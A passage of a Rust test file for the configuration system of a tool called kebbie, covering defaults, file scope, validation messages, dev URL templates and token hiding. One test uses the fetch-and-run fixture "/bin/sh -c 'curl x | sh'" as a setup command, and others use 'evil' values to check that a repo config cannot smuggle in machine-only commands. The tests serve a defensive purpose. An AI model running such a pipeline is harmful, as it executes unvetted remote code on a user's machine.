    assert_eq!(machine("[board.backlog]\nongoing = \"hidden\"\n").ongoing, Some(OngoingAt::Hidden));
    assert_eq!(error("[board.backlog]\nongoing = \"left\"\n"), "/home/u/.config/kebbie/config.toml: board.backlog.ongoing: \"left\" is not a place; use \"top\", \"bottom\" or \"hidden\"");
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(shown.contains("board.backlog.ongoing = \"top\"  (default)\n  Where the Backlog column shows ONGOING"), "{shown}");
}

#[test]
fn restarts_are_automatic_after_ten_idle_minutes_unless_config_toml_says_otherwise() {
    let default = settings(&Worktree::default(), &Machine::default());
    assert_eq!((default.idle_minutes, default.auto_restart), (Setting { value: 10, layer: Layer::Default }, Setting { value: true, layer: Layer::Default }));
    let set = settings(&Worktree::default(), &machine("[restart]\nidle_minutes = 25\nauto = false\n"));
    assert_eq!((set.idle_minutes.value, set.auto_restart.value, set.auto_restart.layer), (25, false, Layer::Machine));
    let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
    for bad in ["0", "1441", "-3", "\"10\"", "2.5"] {
        assert!(error(&format!("[restart]\nidle_minutes = {bad}\n")).contains("restart.idle_minutes: must be a whole number of minutes, 1 to 1440"), "{bad}");
    }
    assert!(error("[restart]\nauto = \"no\"\n").contains("restart.auto: must be true or false"));
    assert!(unknown_machine("[restart]\nidle = 5\n").contains("restart.idle: unknown key; known keys here: idle_minutes, auto"));
    assert!(parse_repo("[restart]\nauto = false\n", "app.toml").unwrap_err().contains("restart: applies to every repo, so it lives in config.toml"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: set });
    assert!(shown.contains("restart.auto = false  (machine config)\n  Whether kebbie restarts") && shown.contains("restart.idle_minutes = 25  (machine config)\n  How long a session that runs older code than is installed waits"), "{shown}");
}

#[test]
fn the_lead_proposes_kebbie_issues_unless_config_toml_turns_it_off() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).propose_issues, Setting { value: true, layer: Layer::Default });
    let off = settings(&Worktree::default(), &machine("[issues]\npropose = false\n"));
    assert_eq!(off.propose_issues, Setting { value: false, layer: Layer::Machine });
    assert!(parse_machine("[issues]\npropose = \"no\"\n", "config.toml").unwrap_err().contains("issues.propose: must be true or false"));
    assert!(unknown_machine("[issues]\nask = true\n").contains("issues.ask: unknown key; known keys here: propose"));
    assert!(unknown_machine("[issues]\npropose = false\n").is_empty());
    assert!(parse_repo("[issues]\npropose = false\n", "app.toml").unwrap_err().contains("issues: applies to every repo, so it lives in config.toml; set [issues] propose in"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
    assert!(shown.contains("issues.propose = false  (machine config)\n  Whether the lead proposes saving a bug or wish about kebbie") && shown.contains("Takes effect when the lead next restarts"), "{shown}");
}

#[test]
fn the_keeper_is_on_unless_config_toml_turns_it_off() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).keeper, Setting { value: true, layer: Layer::Default });
    let off = settings(&Worktree::default(), &machine("[keeper]\nenabled = false\n"));
    assert_eq!(off.keeper, Setting { value: false, layer: Layer::Machine });
    let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
    assert!(error("[keeper]\nenabled = \"no\"\n").contains("keeper.enabled: must be true or false"));
    assert!(unknown_machine("[keeper]\non = true\n").contains("keeper.on: unknown key; known keys here: enabled"));
    assert!(parse_repo("[keeper]\nenabled = false\n", "app.toml").unwrap_err().contains("keeper: applies to every repo, so it lives in config.toml; set [keeper] enabled in"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
    assert!(shown.contains("keeper.enabled = false  (machine config)\n  Whether one background kebbie keeper"), "{shown}");
}

#[test]
fn the_machine_name_is_the_short_hostname_unless_config_toml_names_it() {
    let default = settings(&Worktree::default(), &Machine::default()).machine_name;
    assert_eq!(default.layer, Layer::Default);
    assert!(!default.value.is_empty() && !default.value.contains('.'), "{default:?}");
    let named = settings(&Worktree::default(), &machine("[machine]\nname = \"devbox\"\n"));
    assert_eq!(named.machine_name, Setting { value: "devbox".to_string(), layer: Layer::Machine });
    let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
    assert!(error("[machine]\nname = \"\"\n").contains("machine.name: must be a non-empty string"));
    assert!(error(&format!("[machine]\nname = \"{}\"\n", "x".repeat(65))).contains("at most 64 characters"));
    assert!(error("[machine]\nname = \"a\\tb\"\n").contains("without control characters"));
    assert!(error("[machine]\nname = 7\n").contains("machine.name: must be a string"));
    assert!(error("[machine]\nname = \"LocalHost\"\n").contains("\"localhost\" names every machine"));
    assert!(unknown_machine("[machine]\nhost = \"x\"\n").contains("machine.host: unknown key; known keys here: name"));
    assert!(parse_repo("[machine]\nname = \"x\"\n", "app.toml").unwrap_err().contains("machine: applies to every repo, so it lives in config.toml; set [machine] name in"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: named });
    assert!(shown.contains("machine.name = \"devbox\"  (machine config)\n  The machine's one name"), "{shown}");
}

#[test]
fn resuming_after_api_errors_is_on_unless_config_toml_turns_it_off() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).recover, Setting { value: true, layer: Layer::Default });
    let off = settings(&Worktree::default(), &machine("[recover]\nenabled = false\n"));
    assert_eq!(off.recover, Setting { value: false, layer: Layer::Machine });
    let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
    assert!(error("[recover]\nenabled = 1\n").contains("recover.enabled: must be true or false"));
    assert!(unknown_machine("[recover]\nretries = 3\n").contains("recover.retries: unknown key; known keys here: enabled"));
    assert!(parse_repo("[recover]\nenabled = false\n", "app.toml").unwrap_err().contains("recover: applies to every repo, so it lives in config.toml; set [recover] enabled in"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
    assert!(shown.contains("recover.enabled = false  (machine config)\n  Whether kebbie resumes a task"), "{shown}");
}

#[test]
fn the_update_channel_is_release_unless_the_machine_config_says_main() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).channel, Setting { value: Channel::Release, layer: Layer::Default });
    assert_eq!(settings(&Worktree::default(), &machine("[update]\nchannel = \"main\"\n")).channel, Setting { value: Channel::Main, layer: Layer::Machine });
    assert_eq!(machine("[update]\nchannel = \"release\"\n").channel, Some(Channel::Release));
    assert_eq!(machine("[update]\n").channel, None);
    let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
    assert!(error("[update]\nchannel = \"stable\"\n").contains("update.channel: \"stable\" is not a channel; use \"main\" or \"release\""));
    assert!(unknown_machine("[update]\nchanel = \"main\"\n").contains("update.chanel: unknown key; known keys here: channel"));
    assert!(error("[update]\nchannel = 1\n").contains("update.channel: must be a string"));
    assert!(parse_repo("[update]\nchannel = \"main\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kebbie/repos/app.toml: update: applies to every repo"));
    let default = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(default.contains("update.channel = \"release\"  (default)\n  What kebbie update installs"), "{default}");
    let main = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &machine("[update]\nchannel = \"main\"\n")) });
    assert!(main.contains("update.channel = \"main\"  (machine config)"), "{main}");
}

#[test]
fn agent_updates_ask_unless_the_machine_config_says_auto_or_notify_and_a_bad_value_never_stops_kebbie_update() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).agent_updates, Setting { value: AgentUpdates::Ask, layer: Layer::Default });
    assert_eq!(settings(&Worktree::default(), &machine("[update]\nagents = \"notify\"\n")).agent_updates, Setting { value: AgentUpdates::Notify, layer: Layer::Machine });
    assert_eq!(machine("[update]\nchannel = \"main\"\nagents = \"auto\"\n").agent_updates, Some(AgentUpdates::Auto));
    assert!(parse_machine("[update]\nagents = \"always\"\n", "config.toml").unwrap_err().contains("update.agents: \"always\" is not a choice; use \"ask\", \"auto\" or \"notify\""));
    let dir = scratch("agents-update");
    let config = dir.join("config.toml");
    std::fs::write(&config, "[update]\nchannel = \"main\"\nagents = \"always\"\n").unwrap();
    assert_eq!(channel_in(&config).unwrap(), Channel::Main, "kebbie update reads its channel past a bad update.agents");
    assert_eq!(agent_updates_in(&config), AgentUpdates::Ask, "a value kebbie cannot read asks, as the default does");
    let shown = describe(&Loaded { machine: config, repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(shown.contains("update.agents = \"ask\"  (default)\n  What happens when an agent that does not update itself"), "{shown}");
    let _ = std::fs::remove_dir_all(dir);
}

#[test]
fn reports_go_to_the_issues_endpoint_and_the_inbox_token_is_never_shown() {
    let defaults = settings(&Worktree::default(), &Machine::default());
    assert_eq!((defaults.report_signals.value, defaults.report_text.value, defaults.report_inbox.value), (false, ReportText::Ask, false));
    let config = machine("[report]\nsignals = false\ntext = \"always\"\ninbox_token = \"kha_secret-token-1234\"\n");
    assert_eq!((config.report.url(), config.report.signals(), config.report.text(), config.report.inbox_token.as_deref()), (UNSENT_REPORT_URL, false, ReportText::Always, Some("kha_secret-token-1234")));
    assert!(!format!("{config:?}").contains("kha_secret"), "Debug hides the token");
    let dir = crate::sh::test_dir("config-report");
    let file = dir.join("config.toml");
    std::fs::write(&file, "[report]\ninbox_token = \"kha_secret-token-1234\"\n").unwrap();
    let loaded = Loaded { machine: file.clone(), repo: None, settings: settings(&Worktree::default(), &load_machine(&file).unwrap()) };
    let shown = describe(&loaded);
    assert!(shown.contains("report.inbox_token = set  (machine config)"), "{shown}");
    assert!(!shown.contains("kha_secret"), "{shown}");
    let refused = parse_repo("[report]\ninbox_token = \"kha_x1234567\"\n", "app.toml").unwrap_err();
    assert!(refused.contains("report: applies to every repo, so it lives in config.toml"), "a repo config never holds the token: {refused}");
    assert!(unknown_machine("[report]\nurl = \"https://hub.example.com\"\n").contains("report.url: unknown key"), "the endpoint is not a setting");
    assert!(parse_machine("[report]\ninbox_token = \"khm_machine\"\n", "config.toml").unwrap_err().contains("report.inbox_token"));
    assert!(unknown_machine("[report]\nsecret = 1\n").contains("report.secret: unknown key"));
    let _ = std::fs::remove_dir_all(dir);
}

#[test]
fn a_debug_build_never_addresses_the_production_issues_endpoint() {
    assert_eq!(Report::default().url(), UNSENT_REPORT_URL);
    assert_eq!(crate::hub::hub_url(UNSENT_REPORT_URL).as_deref(), Ok(UNSENT_REPORT_URL), "a loopback address every sender accepts and none can reach beyond this machine");
    assert_ne!(Report::default().url(), REPORT_URL);
}

#[test]
fn signals_are_off_until_set_to_true_and_text_is_asked_by_default_and_an_old_enabled_false_turns_both_off() {
    let fresh = Report::default();
    assert_eq!((fresh.signals(), fresh.signals_asked(), fresh.text()), (false, false, ReportText::Ask), "a key never set is not consent");
    let yes = machine("[report]\nsignals = true\n").report;
    assert_eq!((yes.signals(), yes.signals_asked()), (true, true));
    let no = machine("[report]\nsignals = false\n").report;
    assert_eq!((no.signals(), no.signals_asked()), (false, true));
    let old_off = machine("[report]\nenabled = false\n").report;
    assert_eq!((old_off.signals(), old_off.signals_asked(), old_off.text()), (false, true, ReportText::Never), "a config from before the split keeps everything off");
    let old_on = machine("[report]\nenabled = true\n").report;
    assert_eq!((old_on.signals(), old_on.signals_asked(), old_on.text()), (false, false, ReportText::Ask), "only signals = true turns signals on");
    let mixed = machine("[report]\nenabled = false\nsignals = true\n").report;
    assert_eq!((mixed.signals(), mixed.text()), (true, ReportText::Never), "a new key wins over enabled, key by key");
    let off = settings(&Worktree::default(), &machine("[report]\nenabled = false\n"));
    assert_eq!((off.report_signals.value, off.report_text.value, off.report_signals.layer, off.report_text.layer), (false, ReportText::Never, Layer::Machine, Layer::Machine));
    assert!(parse_machine("[report]\ntext = \"sometimes\"\n", "config.toml").unwrap_err().contains("report.text: must be \"ask\", \"always\" or \"never\""));
    assert!(parse_machine("[report]\nsignals = \"yes\"\n", "config.toml").unwrap_err().contains("report.signals: must be true or false"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(shown.contains("report.signals = false  (default)\n  Whether kebbie sends its maintainers error signals, counts of kebbie's own failures") && shown.contains("Never an error message, path, repo, task or host name") && shown.contains("Not set, nothing is sent and no install id is made; kebbie setup asks"), "{shown}");
    assert!(shown.contains("report.text = \"ask\"  (default)\n  What happens to a bug in kebbie you ran into"), "{shown}");
}

#[test]
fn the_vault_command_is_machine_config_only() {
    let from_machine = machine("[vault]\ncommand = \"uv run --project ~/src/notes-vault-mcp notes-vault-mcp\"\n");
    assert_eq!(settings(&Worktree::default(), &from_machine).vault_command, Setting { value: Some("uv run --project ~/src/notes-vault-mcp notes-vault-mcp".to_string()), layer: Layer::Machine });
    assert!(parse_repo("[vault]\ncommand = \"evil\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kebbie/repos/app.toml: vault: applies to every repo"));
    assert!(unknown_machine("[vault]\ncmd = \"x\"\n").contains("vault.cmd: unknown key; known keys here: command"));
    let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
    assert!(describe(&default).contains("vault.command = none  (default)\n  The vault command kebbie runs"), "{}", describe(&default));
}

#[test]
fn describe_names_each_value_and_its_layer() {
    let loaded = |own: Worktree, machine: Machine| Loaded { machine: PathBuf::from("/c.toml"), repo: Some(PathBuf::from("/home/u/.config/kebbie/repos/app.toml")), settings: settings(&own, &machine) };
    let shown = describe(&loaded(Worktree::default(), Machine::default()));
    assert!(shown.contains("repo config:    /home/u/.config/kebbie/repos/app.toml (not found)"), "{shown}");
    assert!(shown.contains("[[actions]]  (repo config only)\n  The Areas page's own actions for the repo, one table each, with the keys id, key, title,"), "{shown}");
    assert!(shown.contains("machine config: /c.toml (not found)"));
    assert!(shown.contains("board.backlog.sources = [\"local\"]  (default)\n  Where the board's Backlog tab finds work"));
    assert!(shown.contains("worktree.setup_skill = \"kebbie:set-up-worktree\"  (default)"));
    assert!(shown.contains("worktree.dev_server = none  (default)"));
    let shown = describe(&loaded(repo("[worktree]\ndev_server = \"npm run dev\"\n"), machine(MACHINE)));
    assert!(shown.contains("board.backlog.sources = [\"vault\", \"linear\"]  (machine config)"));
    assert!(shown.contains("worktree.setup_skill = \"my-tools:set-up-worktree\"  (machine config)"));
    assert!(shown.contains("worktree.dev_server = \"npm run dev\"  (repo config)"));
    let outside = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
    assert!(describe(&outside).contains("none: not in a git repo"));
}

fn sample(entry: &Entry) -> String {
    if format!("x = {}", entry.value).parse::<Table>().is_ok() {
        return entry.value.clone();
    }
    match &entry.kind {
        Kind::Choice(options) => format!("{:?}", options[1]),
        Kind::Secret => "\"kha_token\"".to_string(),
        _ => "\"x\"".to_string(),
    }
}

#[test]
fn each_keys_scope_is_the_files_that_take_it_and_what_its_text_says() {
    let loaded = Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
    let all = entries(&loaded);
    assert_eq!(all.len(), 43);
    for entry in all {
        let (section, field) = entry.key.rsplit_once('.').unwrap();
        let text = format!("[{section}]\n{field} = {}\n", sample(&entry));
        assert_eq!(parse_machine(&text, "config.toml").is_ok(), entry.scope != Scope::Repo, "{}: {text}", entry.key);
        assert_eq!(parse_repo(&text, "app.toml").is_ok(), entry.scope != Scope::Machine, "{}: {text}", entry.key);
        let machine_only = entry.about.contains("config.toml only") || entry.about.contains("never in a repo config");
        assert_eq!((machine_only, entry.about.contains("repo config only")), (entry.scope == Scope::Machine, entry.scope == Scope::Repo), "{}: {}", entry.key, entry.about);
    }
}

fn place(number: Option<usize>, port: Option<u16>) -> Place {
    Place { worktree: "wt1.app".to_string(), repo: "app".to_string(), number, port }
}

#[test]
fn dev_url_fills_in_each_placeholder() {
    let here = place(Some(1), Some(3001));
    assert_eq!(expand(DEFAULT_DEV_URL, &here).as_deref(), Some("http://localhost:3001"));
    assert_eq!(expand("https://{worktree}.dev", &here).as_deref(), Some("https://wt1.app.dev"));
    assert_eq!(expand("https://{repo}-{number}.test:{port}/", &here).as_deref(), Some("https://app-1.test:3001/"));
    assert_eq!(expand("https://example.test", &here).as_deref(), Some("https://example.test"));
}

#[test]
fn dev_url_reads_the_worktrees_own_port_and_pool_number() {
    let dir = std::env::temp_dir().join(format!("kebbie-dev-url-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(dir.join("wt1.app")).unwrap();
    std::fs::write(dir.join("wt1.app/.env"), "PORT=3001\n").unwrap();
    let url = |template: &str| dev_url(Some(template), &dir.join("app"), &dir.join("wt1.app"));
    assert_eq!(url(DEFAULT_DEV_URL).as_deref(), Some("http://localhost:3001"));
    assert_eq!(url("https://{repo}{number}.test").as_deref(), Some("https://app1.test"));
    std::fs::remove_dir_all(dir).unwrap();
}

#[test]
fn dev_url_gives_no_link_when_the_worktree_lacks_what_it_names() {
    assert_eq!(expand(DEFAULT_DEV_URL, &place(Some(1), None)), None, "no recorded port, no localhost link");
    assert_eq!(expand("https://{worktree}.dev", &place(Some(1), None)).as_deref(), Some("https://wt1.app.dev"), "a template without {{port}} needs none");
    assert_eq!(expand("http://wt{number}.local", &place(None, Some(3000))), None);
    assert_eq!(expand("", &place(Some(1), Some(3001))), None);
}

#[test]
fn an_empty_dev_url_turns_the_link_off_in_either_file() {
    let off = settings(&repo("[worktree]\ndev_url = \"\"\n"), &machine("[worktree]\ndev_url = \"https://{worktree}.dev\"\n"));
    assert_eq!(off.dev_url, Setting { value: None, layer: Layer::Repo });
    let from_machine = settings(&Worktree::default(), &machine("[worktree]\ndev_url = \"https://{worktree}.dev\"\n"));
    assert_eq!(from_machine.dev_url, Setting { value: Some("https://{worktree}.dev".to_string()), layer: Layer::Machine });
    assert_eq!(dev_url(off.dev_url.value.as_deref(), Path::new("/src/app"), Path::new("/src/wt1.app")), None);
    assert_eq!(dev_url(from_machine.dev_url.value.as_deref(), Path::new("/src/app"), Path::new("/src/wt1.app")).as_deref(), Some("https://wt1.app.dev"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
    assert!(shown.contains("worktree.dev_url = \"\" (no link)  (repo config)"), "{shown}");
}

#[test]
fn dev_route_is_off_until_a_repo_config_turns_it_on_and_config_toml_cannot() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).dev_route, Setting { value: false, layer: Layer::Default });
    assert_eq!(settings(&repo("[worktree]\ndev_route = true\n"), &Machine::default()).dev_route, Setting { value: true, layer: Layer::Repo });
    let refused = parse_machine("[worktree]\ndev_route = true\n", "config.toml").unwrap_err();
    assert!(refused.starts_with("config.toml: worktree.dev_route: each repo opts in on its own, so it lives in its repo config"), "{refused}");
    assert!(parse_repo("[worktree]\ndev_route = \"yes\"\n", "app.toml").unwrap_err().contains("worktree.dev_route: must be true or false"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(shown.contains("worktree.dev_route = false  (default)"), "{shown}");
}

#[test]
fn stage_on_main_is_off_until_a_repo_config_turns_it_on_and_config_toml_cannot() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).stage_on_main, Setting { value: false, layer: Layer::Default });
    assert_eq!(settings(&repo("[worktree]\nstage_on_main = true\n"), &Machine::default()).stage_on_main, Setting { value: true, layer: Layer::Repo });
    let refused = parse_machine("[worktree]\nstage_on_main = true\n", "config.toml").unwrap_err();
    assert!(refused.starts_with("config.toml: worktree.stage_on_main: each repo opts in on its own, so it lives in its repo config"), "{refused}");
    assert!(parse_repo("[worktree]\nstage_on_main = 1\n", "app.toml").unwrap_err().contains("worktree.stage_on_main: must be true or false"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(shown.contains("worktree.stage_on_main = false  (default)"), "{shown}");
}

#[test]
fn docs_required_is_off_until_a_repo_config_turns_it_on_and_config_toml_cannot() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).docs_required, Setting { value: false, layer: Layer::Default });
    assert_eq!(settings(&repo("[docs]\nrequired = true\n"), &Machine::default()).docs_required, Setting { value: true, layer: Layer::Repo });
    let refused = parse_machine("[docs]\nrequired = true\n", "config.toml").unwrap_err();
    assert!(refused.starts_with("config.toml: docs.required: each repo opts in on its own, so it lives in its repo config"), "{refused}");
    assert!(parse_repo("[docs]\nrequired = \"yes\"\n", "app.toml").unwrap_err().contains("docs.required: must be true or false"));
    assert!(unknown_repo("[docs]\nrequire = true\n").contains("docs.require: unknown key; known keys here: required"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&repo("[docs]\nrequired = true\n"), &Machine::default()) });
    assert!(shown.contains("docs.required = true  (repo config)"), "{shown}");
}

#[test]
fn an_unknown_placeholder_is_refused_when_loading_with_the_key_named() {
    let refused = parse_repo("[worktree]\ndev_url = \"https://{branch}.dev\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err();
    assert_eq!(refused, "/home/u/.config/kebbie/repos/app.toml: worktree.dev_url: {branch} is not a placeholder; use {worktree}, {repo}, {number} or {port}");
    assert!(parse_machine("[worktree]\ndev_url = \"http://localhost:{port\"\n", "config.toml").unwrap_err().contains("worktree.dev_url: \"http://localhost:{port\" opens a { it never closes"));
    assert!(parse_machine("[worktree]\ndev_url = 3000\n", "config.toml").unwrap_err().contains("worktree.dev_url: must be a string"));
}

#[test]
fn a_path_setup_command_applies_only_in_a_repo_that_has_the_file() {
    let dir = std::env::temp_dir().join(format!("kebbie-setup-in-{}", std::process::id()));
    std::fs::create_dir_all(dir.join("script")).unwrap();
    std::fs::write(dir.join("script/prepare_worktree"), "").unwrap();
    let command = |value: &str| setup_command_in(Some(value.to_string()), &dir);
    assert_eq!(command("script/prepare_worktree --quiet").as_deref(), Some("script/prepare_worktree --quiet"));
    assert_eq!(command("script/elsewhere"), None, "a repo without the file keeps the default setup");
    assert_eq!(command("make prepare").as_deref(), Some("make prepare"), "a bare program comes from PATH");
    assert_eq!(setup_command_in(None, &dir), None);
    let _ = std::fs::remove_dir_all(dir);
}

#[test]
fn setup_command_layers_like_setup_skill() {
    let from_machine = machine("[worktree]\nsetup_command = \"bin/prepare\"\n");
    assert_eq!(settings(&Worktree::default(), &from_machine).setup_command, Setting { value: Some("bin/prepare".to_string()), layer: Layer::Machine });
    let both = settings(&repo("[worktree]\nsetup_command = \"script/prepare_worktree\"\n"), &from_machine);
    assert_eq!(both.setup_command, Setting { value: Some("script/prepare_worktree".to_string()), layer: Layer::Repo });
    assert_eq!(settings(&repo("[worktree]\ndev_server = \"bin/dev\"\n"), &from_machine).setup_command.layer, Layer::Machine);
    assert!(parse_repo("[worktree]\nsetup_command = \" \"\n", "app.toml").unwrap_err().contains("worktree.setup_command: must not be empty"));
    assert!(parse_machine("[worktree]\nsetup_command = [\"x\"]\n", "config.toml").unwrap_err().contains("worktree.setup_command: must be a string"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both });
    assert!(shown.contains("worktree.setup_command = \"script/prepare_worktree\"  (repo config)\n  The repo's own command that prepares an existing worktree"), "{shown}");
    let default = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(default.contains("worktree.setup_command = none  (default)\n  "), "{default}");
    assert!(default.contains("A path applies only in a repo that has the file; elsewhere, and when none, bin/setup-worktree when the repo has one."));
}

#[test]
fn dev_worker_layers_like_dev_server() {
    let both = settings(&repo("[worktree]\ndev_worker = \"bin/jobs\"\n"), &machine("[worktree]\ndev_worker = \"npm run worker\"\n"));
    assert_eq!(both.dev_worker, Setting { value: Some("bin/jobs".to_string()), layer: Layer::Repo });
    assert!(parse_repo("[worktree]\ndev_worker = \"\"\n", "app.toml").unwrap_err().contains("worktree.dev_worker: must not be empty"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both });
    assert!(shown.contains("worktree.dev_worker = \"bin/jobs\"  (repo config)\n  A second command"), "{shown}");
    assert!(shown.contains("worktree.dev_url = \"http://localhost:{port}\"  (default)"), "{shown}");
}

#[test]
fn server_and_worker_names_come_from_the_machine_config_only() {
    let machine = parse_machine("[worktree]\nserver_name = \"web\"\n", "machine").unwrap();
    let resolved = settings(&Worktree::default(), &machine);
    assert_eq!(resolved.server_name, Setting { value: "web".to_string(), layer: Layer::Machine });
    assert_eq!(resolved.worker_name, Setting { value: DEFAULT_WORKER_NAME.to_string(), layer: Layer::Default });
    assert!(parse_repo("[worktree]\nserver_name = \"web\"\n", "repo").unwrap_err().contains("lives in config.toml"));
}

#[test]
fn a_setup_command_that_names_a_path_is_checked_against_the_repo_and_an_absolute_one_passes_as_it_is() {
    let dir = std::env::temp_dir().join(format!("kebbie-setup-abs-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    assert_eq!(setup_command_in(Some("/bin/sh -c 'curl x | sh'".to_string()), &dir).as_deref(), Some("/bin/sh -c 'curl x | sh'"), "an absolute program exists whatever the repo; only the machine config layer should carry one");
    assert_eq!(setup_command_in(Some("./bin/prepare".to_string()), &dir), None);
    std::fs::create_dir_all(dir.join("bin")).unwrap();
    std::fs::write(dir.join("bin/prepare"), "").unwrap();
    assert_eq!(setup_command_in(Some("./bin/prepare --fast".to_string()), &dir).as_deref(), Some("./bin/prepare --fast"));
    assert_eq!(setup_command_in(Some("   ".to_string()), &dir).as_deref(), Some("   "), "an empty command is refused by the parser, not here");
    let _ = std::fs::remove_dir_all(dir);
}

#[test]
fn a_template_refuses_an_empty_or_nested_placeholder_and_keeps_literal_text() {
    let refused = |template: &str| pieces(template).map(|_| ()).unwrap_err();
    assert!(refused("{}").contains("{} is not a placeholder"));
    assert!(refused("{{port}}").contains("{{port} is not a placeholder"));
    assert!(pieces("a } b").is_ok(), "a stray closing brace is text");
    assert!(refused("{port").contains("never closes"));
    assert_eq!(expand("{port}{port}", &Place { worktree: String::new(), repo: String::new(), number: None, port: Some(3) }).as_deref(), Some("33"));
    assert_eq!(expand("literal", &Place { worktree: String::new(), repo: String::new(), number: None, port: None }).as_deref(), Some("literal"));
    assert_eq!(template(&"x = \"  \"".parse().unwrap(), "x", "k").unwrap().as_deref(), Some(""), "whitespace alone is the empty template that turns the link off");
    assert!(text(&"x = \"  \"".parse().unwrap(), "x", "k").unwrap_err().contains("must not be empty"));
}

#[test]
fn the_config_paths_follow_the_environment_variables() {
    let path = path();
    assert!(path.ends_with("config.toml") || std::env::var_os("KEBBIE_CONFIG").is_some());
    assert!(dir().ends_with("kebbie"));
}

#[test]
fn a_repo_config_cannot_hold_a_machine_wide_key_under_another_table() {
    for text in ["[worktree]\nnotify_command = \"x\"\n", "[worktree]\nvault_command = \"x\"\n", "[task]\nnotify = \"x\"\n", "[review]\ncommand = \"x\"\n"] {
        assert!(unknown_repo(text).contains("unknown key"), "{text}");
        assert_eq!(repo(text), Worktree::default(), "{text}");
    }
    assert!(parse_repo("[board]\nbacklog = {}\n", "app.toml").is_err());
    let smuggled = Worktree { vault_command: Some("evil".to_string()), notify_command: Some("evil".to_string()), server_name: Some("x".to_string()), worker_name: Some("y".to_string()), ..Worktree::default() };
    let resolved = settings(&smuggled, &Machine::default());
    assert_eq!(resolved.vault_command.value, None);
    assert_eq!(resolved.notify_command.value, None);
    assert_eq!(resolved.server_name.value, DEFAULT_SERVER_NAME);
    assert_eq!(resolved.worker_name.value, DEFAULT_WORKER_NAME);
}

#[test]
fn task_profile_names_the_profile_a_task_starts_with_and_a_repo_config_wins() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).profile, Setting { value: None, layer: Layer::Default });
    let machine = machine("[task]\nprofile = \"quick\"\n");
    assert_eq!(settings(&Worktree::default(), &machine).profile, Setting { value: Some("quick".to_string()), layer: Layer::Machine });
    let both = settings(&repo("[task]\nprofile = \"designer\"\n"), &machine);
    assert_eq!(both.profile, Setting { value: Some("designer".to_string()), layer: Layer::Repo });
    assert!(parse_repo("[task]\nprofile = \"Design Work\"\n", "app.toml").unwrap_err().contains("task.profile: \"Design Work\" is not a profile name"));
    let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: both });
    assert!(shown.contains("task.profile = \"designer\"  (repo config)\n  The profile a task starts with when kebbie start names none with --profile"), "{shown}");
    let none = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(none.contains("task.profile = none (\"task\")  (default)"), "{none}");
    let reset = settings(&repo("[task]\nprofile = \"none\"\n[review]\nprofile = \"none\"\n"), &parse_machine("[task]\nprofile = \"quick\"\n[review]\nprofile = \"careful-review\"\n", "config.toml").unwrap());
    assert_eq!(reset.profile, Setting { value: None, layer: Layer::Repo }, "none is the built-in task, over the machine's profile");
    assert_eq!(reset.review_profile, Setting { value: crate::profiles::REVIEWER.to_string(), layer: Layer::Repo });
    let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: reset });
    assert!(shown.contains("task.profile = none (\"task\")  (repo config)") && shown.contains("review.profile = \"reviewer\"  (repo config)"), "{shown}");
}

#[test]
fn the_task_sandbox_is_on_until_turned_off_and_a_repo_wins_over_the_machine() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).sandbox, Setting { value: true, layer: Layer::Default });
